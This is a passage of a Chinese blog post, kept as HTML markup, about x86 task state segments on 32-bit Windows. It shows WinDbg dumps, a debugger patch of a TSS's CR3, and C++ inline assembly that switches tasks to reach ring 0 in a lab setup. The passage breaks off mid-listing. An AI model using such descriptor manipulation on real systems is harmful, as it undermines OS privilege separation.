class="number">0x28</span>               <span class="comment">// 上一个段的</span></span><br><span class="line">   +<span class="number">0x002</span> Reserved0        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x004</span> Esp0             : <span class="number">0x40b0d0</span></span><br><span class="line">   +<span class="number">0x008</span> Ss0              : <span class="number">0x10</span></span><br><span class="line">   +<span class="number">0x00a</span> Reserved1        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> NotUsed1         : [<span class="number">4</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> CR3              : <span class="number">0x3f31e640</span></span><br><span class="line">   +<span class="number">0x020</span> Eip              : <span class="number">0x401080</span></span><br><span class="line">   +<span class="number">0x024</span> EFlags           : <span class="number">2</span></span><br><span class="line">   +<span class="number">0x028</span> Eax              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x02c</span> Ecx              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x030</span> Edx              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x034</span> Ebx              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> Esp              : <span class="number">0x40d0d0</span></span><br><span class="line">   +<span class="number">0x03c</span> Ebp              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x040</span> Esi              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x044</span> Edi              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x048</span> Es               : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x04a</span> Reserved2        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x04c</span> Cs               : <span class="number">8</span></span><br><span class="line">   +<span class="number">0x04e</span> Reserved3        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x050</span> Ss               : <span class="number">0x10</span></span><br><span class="line">   +<span class="number">0x052</span> Reserved4        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x054</span> Ds               : <span class="number">0x23</span></span><br><span class="line">   +<span class="number">0x056</span> Reserved5        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x058</span> Fs               : <span class="number">0x30</span></span><br><span class="line">   +<span class="number">0x05a</span> Reserved6        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05c</span> Gs               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05e</span> Reserved7        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x060</span> LDT              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x062</span> Reserved8        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x064</span> Flags            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x066</span> IoMapBase        : <span class="number">0x20ac</span></span><br><span class="line">   +<span class="number">0x068</span> IoMaps           : [<span class="number">1</span>] _KiIoAccessMap</span><br><span class="line">   +<span class="number">0x208c</span> IntDirectionMap  : [<span class="number">32</span>]  <span class="string">&quot;&quot;</span></span><br><span class="line">kd&gt; r</span><br><span class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00000000</span> ecx=<span class="number">00000000</span> edx=<span class="number">00000000</span> esi=<span class="number">00000000</span> edi=<span class="number">00000000</span></span><br><span class="line">eip=<span class="number">00401080</span> esp=<span class="number">0040</span>d0d0 ebp=<span class="number">00000000</span> iopl=<span class="number">0</span>         nv up di pl nz na po nc</span><br><span class="line">cs=<span class="number">0008</span>  ss=<span class="number">0010</span>  ds=<span class="number">0023</span>  es=<span class="number">0023</span>  fs=<span class="number">0030</span>  gs=<span class="number">0000</span>             efl=<span class="number">00004002</span> <span class="comment">// 0100 0000 0000 0010 NT</span></span><br><span class="line">kd&gt; r esp</span><br><span class="line">esp=<span class="number">0040</span>d0d0                <span class="comment">// 上面结构体中的esp</span></span><br><span class="line">kd&gt; dg <span class="number">48</span></span><br><span class="line">                                  P Si Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0048</span> <span class="number">00407030</span> <span class="number">00000100</span> TSS32 Busy <span class="number">3</span> Nb By P  Nl <span class="number">000000</span>eb</span><br><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">80b</span>98800</span><br><span class="line">kd&gt; dq <span class="number">80b</span>98800</span><br><span class="line">ReadVirtual: <span class="number">80b</span>98800 <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">80b</span>98800  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00</span>cf9b00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98810  <span class="number">00</span>cf9300`<span class="number">0000f</span>fff <span class="number">00</span>cffb00`<span class="number">0000f</span>fff</span><br><span class="line"><span class="number">80b</span>98820  <span class="number">00</span>cff300`<span class="number">0000f</span>fff <span class="number">80008b</span>b9`<span class="number">8</span>c0020ab</span><br><span class="line"><span class="number">80b</span>98830  <span class="number">804093b</span>9`b0004fff <span class="number">7f</span>40f3fd`f0000fff</span><br><span class="line"><span class="number">80b</span>98840  <span class="number">0000f</span>200`<span class="number">0400f</span>fff <span class="number">0000</span>eb40`<span class="number">70300100</span>       <span class="comment">// 段描述符中的eb和48中的一致</span></span><br><span class="line"><span class="number">80b</span>98850  <span class="number">800089b</span>9`ad200067 <span class="number">800089b</span>9`acb00067</span><br><span class="line"><span class="number">80b</span>98860  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line"><span class="number">80b</span>98870  <span class="number">800092b</span>9`<span class="number">880003f</span>f <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">kd&gt; r esp</span><br><span class="line">esp=<span class="number">0040</span>d0d0</span><br><span class="line">kd&gt; dds <span class="number">0040</span>d0d0        <span class="comment">// 使用call跨段跳转时会保存cs、esp、ss、eip</span></span><br><span class="line"><span class="number">0040</span>d0d0  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d0d4  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d0d8  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d0dc  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d0e0  <span class="number">00000004</span></span><br><span class="line"><span class="number">0040</span>d0e4  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d0e8  <span class="number">00000002</span></span><br><span class="line"><span class="number">0040</span>d0ec  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d0f0  <span class="number">00000001</span></span><br><span class="line"><span class="number">0040</span>d0f4  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d0f8  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d0fc  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d100  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d104  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d108  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d10c  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d110  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d114  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d118  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d11c  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d120  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d124  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d128  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d12c  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d130  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d134  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d138  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d13c  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d140  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d144  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d148  <span class="number">00000000</span></span><br><span class="line"><span class="number">0040</span>d14c  <span class="number">00000000</span></span><br></pre></td></tr></table></figure><h4 id="通过jmp指令提权"><a href="#通过jmp指令提权" class="headerlink" title="通过jmp指令提权"></a>通过jmp指令提权</h4><ul><li>jmp可以通过任务段提权, 同时替换CS和SS寄存器</li></ul><h4 id="怎样返回3环"><a href="#怎样返回3环" class="headerlink" title="怎样返回3环"></a>怎样返回3环</h4><blockquote><p>使用call跨段跳转时会保存cs、esp、ss、eip, 使用任务门时没保存这些值, 怎么返回？</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;          <span class="comment">// &lt;-- 导致系统奔溃的主要原因, 清空了NT位</span></span><br><span class="line"></span><br><span class="line">iretd;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note info"><p><strong>问题剖析</strong></p><ul><li>恢复运行后将导致系统崩溃, 中断门会修改VM、NT、IF、TF位, 并按照堆栈返回, 当NT位置0后再根据堆栈返回时将出现系统崩溃;</li><li>iretd指令首先检测eflag.NT位, 如果NT位等于0, 就按照堆栈返回; 如果NT位等于1, 就按照Backlink找到要返回的上下文环境返回;</li></ul></div><ul><li>解决方式</li></ul><ol><li><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) <span class="built_in">test</span>()</span><br><span class="line">&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> <span class="number">3</span>;</span><br><span class="line">        pushfd;</span><br><span class="line">        pop eax;</span><br><span class="line">        <span class="keyword">or</span> eax, <span class="number">0x4000</span>;</span><br><span class="line">        push eax;</span><br><span class="line">        popfd;</span><br><span class="line">iretd;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>需要手动修复dg 28中_KTSS结构的CR3<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span></span><br><span class="line">**** NT ACTIVE PROCESS DUMP ****</span><br><span class="line">...</span><br><span class="line">PROCESS <span class="number">85b</span>021a8  SessionId: <span class="number">1</span>  Cid: <span class="number">0e60</span>    Peb: <span class="number">7f</span>fde000  ParentCid: <span class="number">0e4</span>c</span><br><span class="line">    DirBase: <span class="number">3f</span>344640  ObjectTable: <span class="number">959357</span>d8  HandleCount:   <span class="number">7.</span></span><br><span class="line">    Image: <span class="number">09</span>_27_TaskSegments(ÈÎÎñ¶Î).exe</span><br><span class="line">kd&gt; dg <span class="number">28</span></span><br><span class="line">                                  P Si Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0028</span> <span class="number">80b</span>98c00 <span class="number">000020</span>ab TSS32 Busy <span class="number">0</span> Nb By P  Nl <span class="number">0000008b</span></span><br><span class="line">kd&gt; dt _KTSS <span class="number">80b</span>98c00</span><br><span class="line">ntdll!_KTSS</span><br><span class="line">   +<span class="number">0x000</span> Backlink         : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x002</span> Reserved0        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x004</span> Esp0             : <span class="number">0x83f75cb0</span></span><br><span class="line">   +<span class="number">0x008</span> Ss0              : <span class="number">0x10</span></span><br><span class="line">   +<span class="number">0x00a</span> Reserved1        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> NotUsed1         : [<span class="number">4</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> CR3              : <span class="number">0</span>          <span class="comment">// &lt;-- 需要手动修复成该程序的CR3</span></span><br><span class="line">   +<span class="number">0x020</span> Eip              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x024</span> EFlags           : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x028</span> Eax              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x02c</span> Ecx              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x030</span> Edx              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x034</span> Ebx              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> Esp              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x03c</span> Ebp              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x040</span> Esi              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x044</span> Edi              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x048</span> Es               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x04a</span> Reserved2        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x04c</span> Cs               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x04e</span> Reserved3        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x050</span> Ss               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x052</span> Reserved4        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x054</span> Ds               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x056</span> Reserved5        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x058</span> Fs               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05a</span> Reserved6        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05c</span> Gs               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05e</span> Reserved7        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x060</span> LDT              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x062</span> Reserved8        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x064</span> Flags            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x066</span> IoMapBase        : <span class="number">0x20ac</span></span><br><span class="line">   +<span class="number">0x068</span> IoMaps           : [<span class="number">1</span>] _KiIoAccessMap</span><br><span class="line">   +<span class="number">0x208c</span> IntDirectionMap  : [<span class="number">32</span>]  <span class="string">&quot;???&quot;</span></span><br><span class="line">kd&gt; eq <span class="number">80b</span>98c00+<span class="number">1</span>c <span class="number">3f</span>344640</span><br><span class="line">WriteVirtual: <span class="number">80b</span>98c1c <span class="keyword">not</span> properly sign extended</span><br><span class="line">kd&gt; dt _KTSS <span class="number">80b</span>98c00</span><br><span class="line">ntdll!_KTSS</span><br><span class="line">   +<span class="number">0x000</span> Backlink         : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x002</span> Reserved0        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x004</span> Esp0             : <span class="number">0x83f75cb0</span></span><br><span class="line">   +<span class="number">0x008</span> Ss0              : <span class="number">0x10</span></span><br><span class="line">   +<span class="number">0x00a</span> Reserved1        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x00c</span> NotUsed1         : [<span class="number">4</span>] <span class="number">0</span></span><br><span class="line">   +<span class="number">0x01c</span> CR3              : <span class="number">0x3f344640</span>         <span class="comment">// &lt;-- 修复后</span></span><br><span class="line">   +<span class="number">0x020</span> Eip              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x024</span> EFlags           : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x028</span> Eax              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x02c</span> Ecx              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x030</span> Edx              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x034</span> Ebx              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x038</span> Esp              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x03c</span> Ebp              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x040</span> Esi              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x044</span> Edi              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x048</span> Es               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x04a</span> Reserved2        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x04c</span> Cs               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x04e</span> Reserved3        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x050</span> Ss               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x052</span> Reserved4        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x054</span> Ds               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x056</span> Reserved5        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x058</span> Fs               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05a</span> Reserved6        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05c</span> Gs               : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x05e</span> Reserved7        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x060</span> LDT              : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x062</span> Reserved8        : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x064</span> Flags            : <span class="number">0</span></span><br><span class="line">   +<span class="number">0x066</span> IoMapBase        : <span class="number">0x20ac</span></span><br><span class="line">   +<span class="number">0x068</span> IoMaps           : [<span class="number">1</span>] _KiIoAccessMap</span><br><span class="line">   +<span class="number">0x208c</span> IntDirectionMap  : [<span class="number">32</span>]  <span class="string">&quot;???&quot;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><blockquote><p>包含使用jmp指令实现任务切换</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 09_27_TaskSegments(任务段).cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务段</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// _KTSS 结构原形</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ntdll!_KTSS</span></span><br><span class="line"><span class="comment">   +0x000 Backlink         : Uint2B</span></span><br><span class="line"><span class="comment">   +0x002 Reserved0        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x004 Esp0             : Uint4B</span></span><br><span class="line"><span class="comment">   +0x008 Ss0              : Uint2B</span></span><br><span class="line"><span class="comment">   +0x00a Reserved1        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x00c NotUsed1         : [4] Uint4B</span></span><br><span class="line"><span class="comment">   +0x01c CR3              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x020 Eip              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x024 EFlags           : Uint4B</span></span><br><span class="line"><span class="comment">   +0x028 Eax              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x02c Ecx              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x030 Edx              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x034 Ebx              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x038 Esp              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x03c Ebp              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x040 Esi              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x044 Edi              : Uint4B</span></span><br><span class="line"><span class="comment">   +0x048 Es               : Uint2B</span></span><br><span class="line"><span class="comment">   +0x04a Reserved2        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x04c Cs               : Uint2B</span></span><br><span class="line"><span class="comment">   +0x04e Reserved3        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x050 Ss               : Uint2B</span></span><br><span class="line"><span class="comment">   +0x052 Reserved4        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x054 Ds               : Uint2B</span></span><br><span class="line"><span class="comment">   +0x056 Reserved5        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x058 Fs               : Uint2B</span></span><br><span class="line"><span class="comment">   +0x05a Reserved6        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x05c Gs               : Uint2B</span></span><br><span class="line"><span class="comment">   +0x05e Reserved7        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x060 LDT              : Uint2B</span></span><br><span class="line"><span class="comment">   +0x062 Reserved8        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x064 Flags            : Uint2B</span></span><br><span class="line"><span class="comment">   +0x066 IoMapBase        : Uint2B</span></span><br><span class="line"><span class="comment">   +0x068 IoMaps           : [1] _KiIoAccessMap</span></span><br><span class="line"><span class="comment">   +0x208c IntDirectionMap  : [32] UChar</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> szRet[<span class="number">6</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">// jmp 任务切换跳回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//0x2024 bytes (sizeof)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_KiIoAccessMap</span></span><br><span class="line">&#123;</span><br><span class="line">UCHAR DirectionMap[<span class="number">32</span>];                                                 <span class="comment">//0x0</span></span><br><span class="line">UCHAR IoMap[<span class="number">8196</span>];                                                      <span class="comment">//0x20</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//0x20ac bytes (sizeof)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_KTSS</span></span><br><span class="line">&#123;</span><br><span class="line">USHORT Backlink;                                                        <span class="comment">//0x0</span></span><br><span class="line">USHORT Reserved0;                                                       <span class="comment">//0x2</span></span><br><span class="line">ULONG Esp0;                                                             <span class="comment">//0x4</span></span><br><span class="line">USHORT Ss0;                                                             <span class="comment">//0x8</span></span><br><span class="line">USHORT Reserved1;                                                       <span class="comment">//0xa</span></span><br><span class="line">ULONG NotUsed1[<span class="number">4</span>];                                                      <span class="comment">//0xc</span></span><br><span class="line">ULONG CR3;                                                              <span class="comment">//0x1c</span></span><br><span class="line">ULONG Eip;                                                              <span class="comment">//0x20</span></span><br><span class="line">ULONG EFlags;                                                           <span class="comment">//0x24</span></span><br><span class="line">ULONG Eax;                                                              <span class="comment">//0x28</span></span><br><span class="line">ULONG Ecx;                                                              <span class="comment">//0x2c</span></span><br><span class="line">ULONG Edx;                                                              <span class="comment">//0x30</span></span><br><span class="line">ULONG Ebx;                                                              <span class="comment">//0x34</span></span><br><span class="line">ULONG Esp;                                                              <span class="comment">//0x38</span></span><br><span class="line">ULONG Ebp;                                                              <span class="comment">//0x3c</span></span><br><span class="line">ULONG Esi;                                                              <span class="comment">//0x40</span></span><br><span class="line">ULONG Edi;                                                              <span class="comment">//0x44</span></span><br><span class="line">USHORT Es;                                                              <span class="comment">//0x48</span></span><br><span class="line">USHORT Reserved2;                                                       <span class="comment">//0x4a</span></span><br><span class="line">USHORT Cs;                                                              <span class="comment">//0x4c</span></span><br><span class="line">USHORT Reserved3;                                                       <span class="comment">//0x4e</span></span><br><span class="line">USHORT Ss;                                                              <span class="comment">//0x50</span></span><br><span class="line">USHORT Reserved4;                                                       <span class="comment">//0x52</span></span><br><span class="line">USHORT Ds;                                                              <span class="comment">//0x54</span></span><br><span class="line">USHORT Reserved5;                                                       <span class="comment">//0x56</span></span><br><span class="line">USHORT Fs;                                                              <span class="comment">//0x58</span></span><br><span 